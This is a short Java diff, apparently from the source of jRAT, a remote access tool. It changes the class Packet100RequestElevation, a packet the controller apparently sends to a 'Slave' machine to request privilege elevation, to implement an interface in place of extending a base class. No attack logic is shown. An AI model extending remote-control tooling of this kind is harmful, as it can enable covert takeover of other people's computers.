@@ -2,7 +2,7 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-public class Packet100RequestElevation extends AbstractOutgoingPacket {
+public class Packet100RequestElevation implements OutgoingPacket {
 
 	@Override
 	public void write(Slave slave) throws Exception {
